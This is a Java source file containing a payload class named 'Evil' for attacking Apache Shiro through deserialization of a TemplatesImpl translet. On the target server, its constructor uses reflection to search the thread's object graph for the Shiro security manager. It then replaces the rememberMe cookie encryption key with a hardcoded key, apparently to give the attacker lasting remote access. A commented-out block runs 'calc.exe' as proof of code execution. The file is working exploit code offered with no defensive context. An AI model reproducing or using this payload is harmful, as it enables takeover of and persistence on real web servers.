package com.govuln.shiroattack;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.shiro.web.mgt.CookieRememberMeManager;
import org.apache.shiro.web.mgt.DefaultWebSecurityManager;
import sun.misc.BASE64Decoder;

import java.io.IOException;
import java.lang.reflect.Field;
import java.util.HashSet;


public class Evil extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

    static HashSet<Object> h;
    static DefaultWebSecurityManager r;

    public Evil() throws IOException {
        r = null;
        h =new HashSet<Object>();
        F(Thread.currentThread(),0);
    }

    private static boolean i(Object obj){
        if(obj==null|| h.contains(obj)){
            return true;
        }

        h.add(obj);
        return false;
    }
    private static void p(Object o, int depth) throws IOException {
        if(depth > 52||(r !=null)){
            return;
        }
        if(!i(o)){
            if(r ==null&& DefaultWebSecurityManager.class.isAssignableFrom(o.getClass())){
                r = (DefaultWebSecurityManager)o;
            }
            if(r != null){
                CookieRememberMeManager cookieRememberMeManager = (CookieRememberMeManager) r.getRememberMeManager();
                cookieRememberMeManager.setCipherKey(new BASE64Decoder().decodeBuffer("PEF+bI6k7D2aaZiXxcaaaC=="));
                return;
            }

            F(o,depth+1);
        }
    }
    private static void F(Object start, int depth){

        Class n=start.getClass();
        do{
            for (Field declaredField : n.getDeclaredFields()) {
                declaredField.setAccessible(true);
                Object o = null;
                try{
                    o = declaredField.get(start);

                    if(!o.getClass().isArray()){
                        p(o,depth);
                    }else{
                        for (Object q : (Object[]) o) {
                            p(q, depth);
                        }

                    }

                }catch (Exception e){
                }
            }

        }while(
                (n = n.getSuperclass())!=null
        );
    }

//    public Evil() throws Exception {
//        super();
//        System.out.println("Hello TemplatesImpl");
//        Runtime.getRuntime().exec("calc.exe");
//
//    }

}